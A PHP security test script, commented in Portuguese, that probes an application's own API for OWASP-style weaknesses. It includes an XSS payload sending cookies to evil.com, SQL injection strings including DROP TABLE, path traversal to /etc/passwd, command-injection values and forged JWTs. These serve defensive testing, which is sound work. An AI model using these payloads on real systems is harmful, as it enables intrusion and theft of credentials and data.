test('INVENTORY: /composer.json não expõe dependências', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/composer.json");
    if ($res['status'] === 200) {
        $body = $res['raw'] ?? '';
        if (str_contains($body, '"require"') || str_contains($body, '"firebase/php-jwt"')) {
            return "composer.json acessível — expõe dependências e versões";
        }
    }
    return null;
});

test('INVENTORY: /phpinfo não está exposto', function () use ($baseUrl) {
    foreach (['/phpinfo', '/phpinfo.php', '/info.php', '/php_info.php'] as $path) {
        $res = req('GET', "$baseUrl$path");
        if ($res['status'] === 200) {
            $body = $res['raw'] ?? '';
            if (str_contains($body, 'PHP Version') || str_contains($body, 'phpinfo()')) {
                return "phpinfo exposto em $path — CRÍTICO";
            }
        }
    }
    return null;
});

test('INVENTORY: /api/debug não está exposto', function () use ($baseUrl) {
    foreach (['/api/debug', '/debug', '/api/test', '/test.php'] as $path) {
        $res = req('GET', "$baseUrl$path");
        if ($res['status'] === 200 && !empty($res['body'])) {
            $body = json_encode($res['body']);
            if (str_contains($body, 'debug') || str_contains($body, 'trace')) {
                return "Endpoint de debug exposto em $path";
            }
        }
    }
    return null;
});

test('INVENTORY: /api/status não expõe informações sensíveis de infra', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    $body = json_encode($res['body']);
    // Não deve expor senhas, secrets ou IPs internos
    if (str_contains($body, 'DB_SENHA') || str_contains($body, 'JWT_SECRET') || str_contains($body, 'password')) {
        return "Status expõe informações sensíveis de configuração";
    }
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// API10:2023 — Unsafe Consumption of APIs
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[API10] Unsafe Consumption of APIs\033[0m\n";

test('UNSAFE: Dados de terceiros com XSS não são executados na resposta', function () use ($baseUrl) {
    // Simula dado malicioso vindo de "API externa" via campo de perfil
    $xss = '<script>document.location="https://evil.com?c="+document.cookie</script>';
    $res = req('POST', "$baseUrl/api/registrar", [
        'nome_completo' => $xss,
        'username'      => 'xss_'.uniqid(),
        'email'         => 'xss_'.uniqid().'@test.invalid',
        'senha'         => 'Senha@12345',
        'biografia'     => $xss,
    ]);
    if ($res['status'] === 500) return "XSS no campo causou erro 500";
    // Se criou, verifica que a resposta JSON não executa o script
    $ct = $res['headers']['content-type'] ?? '';
    if (!str_contains($ct, 'application/json')) return "Resposta não é JSON — possível XSS reflected";
    return null;
});

test('UNSAFE: Dados com null bytes não causam crash', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => "admin\x00@test.com", 'senha' => "senha\x00"]);
    if ($res['status'] === 500) return "Null byte causou erro 500";
    return null;
});

test('UNSAFE: Dados com caracteres Unicode especiais não causam crash', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", [
        'login' => "admin\u{202E}@test.com", // Right-to-left override
        'senha' => "\u{FEFF}senha",           // BOM
    ]);
    if ($res['status'] === 500) return "Unicode especial causou erro 500";
    return null;
});

test('UNSAFE: Dados com CRLF injection não causam header injection', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", [
        'login' => "admin@test.com\r\nX-Injected: evil",
        'senha' => "senha\r\nSet-Cookie: evil=1",
    ]);
    if ($res['status'] === 500) return "CRLF injection causou erro 500";
    // Verifica que header injetado não aparece
    if (isset($res['headers']['x-injected'])) return "CRLF injection bem-sucedido — header X-Injected presente";
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// Injeção — SQL, NoSQL, Command, Path Traversal
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[INJ] Injeção (SQL, XSS, Command, Path Traversal)\033[0m\n";

$sqlPayloads = [
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "'; DROP TABLE usuarios; --",
    "' UNION SELECT 1,2,3 --",
    "admin'--",
    "' OR 'x'='x",
    "1; SELECT * FROM usuarios",
    "' AND SLEEP(1) --",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
];

test('SQL: Nenhum payload SQL no login causa 500 ou login bem-sucedido', function () use ($baseUrl, $sqlPayloads) {
    foreach ($sqlPayloads as $payload) {
        $res = req('POST', "$baseUrl/api/login", ['login' => $payload, 'senha' => $payload]);
        if ($res['status'] === 500) return "SQL payload causou 500: $payload";
        if ($res['status'] === 200 && !empty($res['body']['access_token'])) {
            return "SQL INJECTION BEM-SUCEDIDO com: $payload — CRÍTICO";
        }
    }
    return null;
});

test('SQL: SQL injection no campo de recuperação de senha não causa 500', function () use ($baseUrl, $sqlPayloads) {
    foreach ($sqlPayloads as $payload) {
        $res = req('POST', "$baseUrl/api/auth/recuperacao-senha", ['email' => $payload]);
        if ($res['status'] === 500) return "SQL payload causou 500 na recuperação: $payload";
    }
    return null;
});

test('SQL: SQL injection no UUID de rota não causa 500', function () use ($baseUrl, $sqlPayloads) {
    foreach (["' OR 1=1 --", "1; DROP TABLE usuarios"] as $payload) {
        $encoded = urlencode($payload);
        $res = req('GET', "$baseUrl/api/usuario/$encoded");
        if ($res['status'] === 500) return "SQL no UUID causou 500: $payload";
    }
    return null;
});

test('PATH: Path traversal em parâmetros de rota não expõe arquivos', function () use ($baseUrl) {
    $traversals = ['../../../etc/passwd', '..%2F..%2F..%2Fetc%2Fpasswd', '....//....//etc/passwd'];
    foreach ($traversals as $t) {
        $res = req('GET', "$baseUrl/api/usuario/$t");
        $body = $res['raw'] ?? '';
        if (str_contains($body, 'root:') || str_contains($body, '/bin/bash')) {
            return "Path traversal expôs /etc/passwd: $t";
        }
        if ($res['status'] === 500) return "Path traversal causou 500: $t";
    }
    return null;
});

test('CMD: Command injection em campos de texto não é executado', function () use ($baseUrl) {
    $cmds = ['$(id)', '`id`', '; ls -la', '| cat /etc/passwd', '&& whoami'];
    foreach ($cmds as $cmd) {
        $res = req('POST', "$baseUrl/api/login", ['login' => "admin$cmd@test.com", 'senha' => "senha$cmd"]);
        if ($res['status'] === 500) return "Command injection causou 500: $cmd";
        $body = $res['raw'] ?? '';
        if (preg_match('/uid=\d+|root:|www-data/', $body)) {
            return "Command injection executado: $cmd — CRÍTICO";
        }
    }
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// HTTP Verb Tampering
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[VERB] HTTP Verb Tampering\033[0m\n";

test('VERB: TRACE não está habilitado', function () use ($baseUrl) {
    $res = req('TRACE', "$baseUrl/api/status");
    if ($res['status'] === 200) {
        $body = $res['raw'] ?? '';
        if (str_contains($body, 'TRACE') || str_contains($body, 'Authorization')) {
            return "TRACE habilitado — risco de XST (Cross-Site Tracing)";
        }
    }
    return null;
});

test('VERB: DELETE em /api/status retorna 404 (não 200/500)', function () use ($baseUrl) {
    $res = req('DELETE', "$baseUrl/api/status");
    if ($res['status'] === 200) return "DELETE em rota GET retornou 200";
    if ($res['status'] === 500) return "DELETE causou erro 500";
    return null;
});

test('VERB: PUT em /api/login retorna 404 (não 200/500)', function () use ($baseUrl) {
    $res = req('PUT', "$baseUrl/api/login", ['login' => 'x', 'senha' => 'y']);
    if ($res['status'] === 200) return "PUT em rota POST retornou 200";
    if ($res['status'] === 500) return "PUT causou erro 500";
    return null;
});

test('VERB: PATCH em /api/status retorna 404 (não 200/500)', function () use ($baseUrl) {
    $res = req('PATCH', "$baseUrl/api/status");
    if ($res['status'] === 200) return "PATCH em rota GET retornou 200";
    if ($res['status'] === 500) return "PATCH causou erro 500";
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// Broken Cryptography
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[CRYPTO] Broken Cryptography\033[0m\n";

test('CRYPTO: Resposta de login não expõe hash de senha', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => 'admin@example.com', 'senha' => 'errada']);
    $body = json_encode($res['body']);
    if (preg_match('/\$2[ayb]\$\d+\$/', $body)) return "Hash bcrypt exposto na resposta de erro";
    if (preg_match('/[a-f0-9]{32,64}/', $body) && str_contains(strtolower($body), 'hash')) return "Hash exposto na resposta";
    return null;
});

test('CRYPTO: JWT usa HS256 (não algoritmo fraco)', function () use ($baseUrl) {
    // Verifica que o sistema rejeita tokens com alg:HS1 ou alg:MD5
    $h = rtrim(strtr(base64_encode('{"alg":"HS1","typ":"JWT"}'), '+/', '-_'), '=');
    $p = rtrim(strtr(base64_encode(json_encode(['sub'=>'uuid','tipo'=>'user','exp'=>time()+3600,'jti'=>'jti'])), '+/', '-_'), '=');
    $s = rtrim(strtr(base64_encode('sig'), '+/', '-_'), '=');
    $res = req('GET', "$baseUrl/api/perfil", [], ["Authorization: Bearer $h.$p.$s"]);
    return assertStatus($res, 401);
});

test('CRYPTO: JWT com alg:RS256 forjado não é aceito', function () use ($baseUrl) {
    // Ataque de confusão de algoritmo: envia RS256 mas assina com HMAC usando chave pública
    $h = rtrim(strtr(base64_encode('{"alg":"RS256","typ":"JWT"}'), '+/', '-_'), '=');
    $p = rtrim(strtr(base64_encode(json_encode(['sub'=>'admin','tipo'=>'user','exp'=>time()+3600,'jti'=>'jti'])), '+/', '-_'), '=');
    $s = rtrim(strtr(base64_encode('fake_rsa_sig'), '+/', '-_'), '=');
    $res = req('GET', "$baseUrl/api/perfil", [], ["Authorization: Bearer $h.$p.$s"]);
    return assertStatus($res, 401);
});

// ═══════════════════════════════════════════════════════════════════════════
// Endpoints Públicos e Módulos Essenciais
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[INFRA] Infraestrutura e Módulos Essenciais\033[0m\n";

test('INFRA: GET /api/status retorna 200', function () use ($baseUrl) {
    return assertStatus(req('GET', "$baseUrl/api/status"), 200);
});

test('INFRA: GET /api/db-status responde (não crash)', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/db-status");
    if ($res['status'] === 0) return "Servidor não respondeu";
    return null;
});

test('INFRA: GET /sitemap.xml retorna 200 com XML', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/sitemap.xml");
    if ($res['status'] !== 200) return "Esperado 200, recebido {$res['status']}";
    if (!str_contains($res['headers']['content-type'] ?? '', 'xml')) return "Content-Type não é XML";
    return null;
});

test('INFRA: GET /robots.txt retorna 200', function () use ($baseUrl) {
    return assertStatus(req('GET', "$baseUrl/robots.txt"), 200);
});

test('INFRA: robots.txt bloqueia /api/', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/robots.txt");
    if (!str_contains($res['raw'] ?? '', 'Disallow: /api/')) return "robots.txt não bloqueia /api/";
    return null;
});

test('INFRA: Módulos Auth e Usuario presentes e habilitados', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    if ($res['status'] !== 200) return "Status não retornou 200";
    $modules = $res['body']['modules'] ?? [];
    $names = array_column($modules, 'name');
    if (!in_array('Auth', $names)) return "Módulo Auth não encontrado";
    if (!in_array('Usuario', $names)) return "Módulo Usuario não encontrado";
    foreach ($modules as $m) {
        if (in_array($m['name'], ['Auth', 'Usuario']) && ($m['enabled'] ?? true) === false) {
            return "Módulo essencial {$m['name']} está desabilitado";
        }
    }
    return null;
});

test('INFRA: Módulos essenciais não podem ser desabilitados via API sem auth', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/modules/toggle", ['name' => 'Auth', 'enabled' => false]);
    return assertOneOf($res, [401, 403]);
});

// ═══════════════════════════════════════════════════════════════════════════
// Payload Malformado / Edge Cases
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[EDGE] Payloads Malformados e Edge Cases\033[0m\n";

test('EDGE: JSON malformado retorna 400/401, não 500', function () use ($baseUrl) {
    $res = reqRaw('POST', "$baseUrl/api/login", '{login: "broken json}');
    if ($res['status'] === 500) return "JSON malformado causou 500";
    return null;
});

test('EDGE: Body vazio retorna 400/401, não 500', function () use ($baseUrl) {
    $res = reqRaw('POST', "$baseUrl/api/login", '');
    if ($res['status'] === 500) return "Body vazio causou 500";
    return null;
});

test('EDGE: Body com apenas espaços retorna 400/401, não 500', function () use ($baseUrl) {
    $res = reqRaw('POST', "$baseUrl/api/login", '   ');
    if ($res['status'] === 500) return "Body com espaços causou 500";
    return null;
});

test('EDGE: Content-Type errado (text/plain) não causa 500', function () use ($baseUrl) {
    $ch = curl_init("$baseUrl/api/login");
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_POST=>true, CURLOPT_POSTFIELDS=>'login=x&senha=y', CURLOPT_HTTPHEADER=>['Content-Type: text/plain'], CURLOPT_TIMEOUT=>10]);
    curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
    if ($code === 500) return "Content-Type text/plain causou 500";
    return null;
});

test('EDGE: Array no lugar de string em campo login não causa 500', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => ['a','b','c'], 'senha' => ['x','y']]);
    if ($res['status'] === 500) return "Array em campo string causou 500";
    return null;
});

test('EDGE: null em todos os campos não causa 500', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => null, 'senha' => null]);
    if ($res['status'] === 500) return "null nos campos causou 500";
    return null;
});

test('EDGE: Número muito grande em campo numérico não causa 500', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => PHP_INT_MAX * 999, 'senha' => PHP_FLOAT_MAX]);
    if ($res['status'] === 500) return "Número muito grande causou 500";
    return null;
});

test('EDGE: Boolean em campo de texto não causa 500', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => true, 'senha' => false]);
    if ($res['status'] === 500) return "Boolean em campo texto causou 500";
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// Rate Limiting Real (Anti Brute Force)
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[RATE] Rate Limiting — Anti Brute Force\033[0m\n";

test('RATE: Headers X-RateLimit-* presentes no login', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => 'test@test.com', 'senha' => 'errada']);
    if (!isset($res['headers']['x-ratelimit-limit'])) {
        return "Header X-RateLimit-Limit ausente — rate limiting não implementado";
    }
    return null;
});

test('RATE: X-RateLimit-Remaining decrementa a cada requisição', function () use ($baseUrl) {
    $r1 = req('POST', "$baseUrl/api/login", ['login' => 'a@a.com', 'senha' => 'x']);
    $r2 = req('POST', "$baseUrl/api/login", ['login' => 'b@b.com', 'senha' => 'x']);
    $rem1 = (int)($r1['headers']['x-ratelimit-remaining'] ?? -1);
    $rem2 = (int)($r2['headers']['x-ratelimit-remaining'] ?? -1);
    if ($rem1 < 0) return "X-RateLimit-Remaining ausente";
    if ($rem2 >= $rem1 && $rem1 > 0) return "Remaining não decrementou: $rem1 → $rem2";
    return null;
});

test('RATE: Após 11 tentativas de login, retorna 429', function () use ($baseUrl) {
    $lastStatus = 0;
    for ($i = 0; $i < 12; $i++) {
        $res = req('POST', "$baseUrl/api/login", ['login' => "flood$i@test.com", 'senha' => 'errada']);
        $lastStatus = $res['status'];
        if ($res['status'] === 429) return null;
    }
    return "Após 12 tentativas, não retornou 429 (último: $lastStatus) — brute force não bloqueado";
});

test('RATE: Resposta 429 tem Retry-After header', function () use ($baseUrl) {
    for ($i = 0; $i < 15; $i++) {
        $res = req('POST', "$baseUrl/api/login", ['login' => "retry$i@test.com", 'senha' => 'x']);
        if ($res['status'] === 429) {
            if (!isset($res['headers']['retry-after'])) return "429 sem Retry-After header";
            return null;
        }
    }
    return null;
});

test('RATE: Recuperação de senha tem rate limiting', function () use ($baseUrl) {
    $hit429 = false;
    for ($i = 0; $i < 8; $i++) {
        $res = req('POST', "$baseUrl/api/auth/recuperacao-senha", ['email' => "flood$i@test.invalid"]);
        if ($res['status'] === 429) { $hit429 = true; break; }
    }
    if (!$hit429) return "Recuperação de senha sem rate limiting após 8 tentativas";
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// Timing Attack Protection
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[TIMING] Proteção contra Timing Attacks\033[0m\n";

// Limpa rate limit para garantir que os testes de timing não sejam bloqueados
$rlDir = dirname(__DIR__) . '/storage/ratelimit';
if (is_dir($rlDir)) {
    foreach (glob($rlDir . '/*.json') as $f) { @unlink($f); }
}

test('TIMING: Login com usuário inexistente leva >= 150ms', function () use ($baseUrl) {
    $start = microtime(true);
    req('POST', "$baseUrl/api/login", ['login' => 'ghost_'.uniqid().'@x.invalid', 'senha' => 'qualquer123']);
    $elapsed = (microtime(true) - $start) * 1000;
    if ($elapsed < 150) return "Resposta muito rápida ({$elapsed}ms) — timing attack possível";
    return null;
});

test('TIMING: Login com senha errada leva >= 150ms', function () use ($baseUrl) {
    $start = microtime(true);
    req('POST', "$baseUrl/api/login", ['login' => 'admin@example.com', 'senha' => 'errada_'.uniqid()]);
    $elapsed = (microtime(true) - $start) * 1000;
    if ($elapsed < 150) return "Resposta muito rápida ({$elapsed}ms) — timing attack possível";
    return null;
});

test('TIMING: Diferença de tempo entre usuário existente e inexistente < 200ms', function () use ($baseUrl) {
    $times = [];
    for ($i = 0; $i < 3; $i++) {
        $s = microtime(true);
        req('POST', "$baseUrl/api/login", ['login' => 'ghost_'.uniqid().'@x.invalid', 'senha' => 'x']);
        $times[] = (microtime(true) - $s) * 1000;
    }
    $avgGhost = array_sum($times) / count($times);
    $times2 = [];
    for ($i = 0; $i < 3; $i++) {
        $s = microtime(true);
        req('POST', "$baseUrl/api/login", ['login' => 'admin@example.com', 'senha' => 'errada']);
        $times2[] = (microtime(true) - $s) * 1000;
    }
    $avgReal = array_sum($times2) / count($times2);
    $diff = abs($avgGhost - $avgReal);
    if ($diff > 200) return sprintf("Diferença suspeita: %.0fms vs %.0fms (diff: %.0fms)", $avgGhost, $avgReal, $diff);
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// Content-Security-Policy e Headers Avançados
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[CSP] Content-Security-Policy e Headers Avançados\033[0m\n";

test('CSP: Content-Security-Policy presente nas respostas', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    return assertHasHeader($res, 'content-security-policy');
});

test('CSP: CSP contém frame-ancestors para prevenir clickjacking', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    $csp = $res['headers']['content-security-policy'] ?? '';
    if (!str_contains($csp, 'frame-ancestors')) return "CSP não contém frame-ancestors: $csp";
    return null;
});

test('CSP: X-Frame-Options: DENY presente', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    $xfo = strtolower($res['headers']['x-frame-options'] ?? '');
    if ($xfo !== 'deny') return "X-Frame-Options não é DENY: $xfo";
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// Auditoria e Logging
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[AUDIT] Auditoria e Logging\033[0m\n";

test('AUDIT: Login não expõe dados internos de auditoria na resposta', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => 'admin@example.com', 'senha' => 'errada']);
    $body = json_encode($res['body']);
    if (str_contains($body, 'audit') || str_contains($body, 'log_id')) return "Dados de auditoria vazaram na resposta";
    return null;
});

test('AUDIT: Falha de login não expõe detalhes internos de log', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => 'x', 'senha' => 'y']);
    $body = json_encode($res['body']);
    if (str_contains($body, 'audit_log') || str_contains($body, 'INSERT INTO')) return "SQL/auditoria vazou na resposta";
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// Token Replay e Blacklist
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[TOKEN] Token Replay e Blacklist JWT\033[0m\n";

test('TOKEN: Token com assinatura inválida retorna 401 (blacklist check)', function () use ($baseUrl) {
    $h = rtrim(strtr(base64_encode('{"alg":"HS256","typ":"JWT"}'), '+/', '-_'), '=');
    $p = rtrim(strtr(base64_encode(json_encode([
        'sub' => '00000000-0000-0000-0000-000000000001', 'tipo' => 'user',
        'jti' => 'revoked-jti-'.uniqid(), 'exp' => time() + 3600,
    ])), '+/', '-_'), '=');
    $s = rtrim(strtr(base64_encode('fake_sig'), '+/', '-_'), '=');
    $res = req('GET', "$baseUrl/api/perfil", [], ["Authorization: Bearer $h.$p.$s"]);
    return assertStatus($res, 401);
});

test('TOKEN: Refresh token com jti inválido retorna 401', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/auth/refresh", ['refresh_token' => 'token.invalido.jti']);
    return assertOneOf($res, [400, 401]);
});

test('TOKEN: REFRESH_MAX_PER_USER está configurado (limite de sessões)', function () use ($baseUrl) {
    $maxPerUser = (int)(getenv('REFRESH_MAX_PER_USER') ?: 5);
    if ($maxPerUser > 0 && $maxPerUser <= 20) return null;
    return "REFRESH_MAX_PER_USER não configurado adequadamente: $maxPerUser";
});

// ═══════════════════════════════════════════════════════════════════════════
// Resumo Final
// ═══════════════════════════════════════════════════════════════════════════

$total = $passed + $failed;
$pct   = $total > 0 ? round(($passed / $total) * 100, 1) : 0;

echo "\n\033[1;36m╔══════════════════════════════════════════════════════════╗\033[0m\n";
echo "\033[1;36m║                    RESULTADO FINAL                       ║\033[0m\n";
echo "\033[1;36m╚══════════════════════════════════════════════════════════╝\033[0m\n";
printf("  \033[32m✓ Passou:   %3d\033[0m\n", $passed);
printf("  \033[31m✗ Falhou:   %3d\033[0m\n", $failed);
printf("  \033[33m⊘ Ignorado: %3d\033[0m\n", $skipped);
printf("  Taxa de sucesso: \033[1m%.1f%%\033[0m (%d/%d)\n\n", $pct, $passed, $total);

// Agrupa por categoria
$categories = [];
foreach ($results as $r) {
    preg_match('/^\[?([A-Z0-9]+)/', $r['name'], $m);
    $cat = $m[1] ?? 'GERAL';
    $categories[$cat][] = $r;
}

if ($failed > 0) {
    echo "\033[1;31m  FALHAS ENCONTRADAS:\033[0m\n";
    foreach ($results as $r) {
        if ($r['status'] === 'FAIL') {
            echo "  \033[31m✗\033[0m {$r['name']}\n";
            echo "    \033[33m→ ".($r['reason']??'')."\033[0m\n";
        }
    }
    echo "\n";
}

// Relatório por categoria OWASP
echo "\033[1m  COBERTURA POR CATEGORIA:\033[0m\n";
$owasp = [
    'BOLA'      => 'API1:2026 — BOLA / IDOR',
    'AUTH'      => 'API2:2026 — Broken Authentication',
    'MASS'      => 'API3:2026 — Mass Assignment',
    'RESOURCE'  => 'API4:2026 — Resource Consumption',
    'BFLA'      => 'API5:2026 — Broken Function Level Auth',
    'FLOW'      => 'API6:2026 — Sensitive Business Flows',
    'SSRF'      => 'API7:2026 — SSRF',
    'MISCONFIG' => 'API8:2026 — Security Misconfiguration',
    'INVENTORY' => 'API9:2026 — Inventory Management',
    'UNSAFE'    => 'API10:2026 — Unsafe API Consumption',
    'SQL'       => 'Injeção SQL',
    'PATH'      => 'Path Traversal',
    'CMD'       => 'Command Injection',
    'VERB'      => 'HTTP Verb Tampering',
    'CRYPTO'    => 'Broken Cryptography',
    'RATE'      => 'Rate Limiting / Anti Brute Force',
    'TIMING'    => 'Timing Attack Protection',
    'CSP'       => 'Content-Security-Policy',
    'AUDIT'     => 'Auditoria e Logging',
    'TOKEN'     => 'Token Replay / Blacklist JWT',
    'INFRA'     => 'Infraestrutura',
    'EDGE'      => 'Edge Cases / Robustez',
];
foreach ($owasp as $prefix => $label) {
    $cat = array_filter($results, fn($r) => str_starts_with($r['name'], "$prefix:"));
    if (empty($cat)) continue;
    $p = count(array_filter($cat, fn($r) => $r['status'] === 'PASS'));
    $f = count(array_filter($cat, fn($r) => $r['status'] === 'FAIL'));
    $t = $p + $f;
    $icon = $f > 0 ? "\033[31m✗\033[0m" : "\033[32m✓\033[0m";
    printf("  %s  %-42s %d/%d\n", $icon, $label, $p, $t);
}

echo "\n";
if ($failed === 0) {
    echo "\033[1;32m  ✓ TODOS OS TESTES PASSARAM — API SEGURA\033[0m\n\n";
} else {
    echo "\033[1;31m  ✗ $failed TESTE(S) FALHARAM — CORRIJA ANTES DE PRODUÇÃO\033[0m\n\n";
}

exit($failed > 0 ? 1 : 0);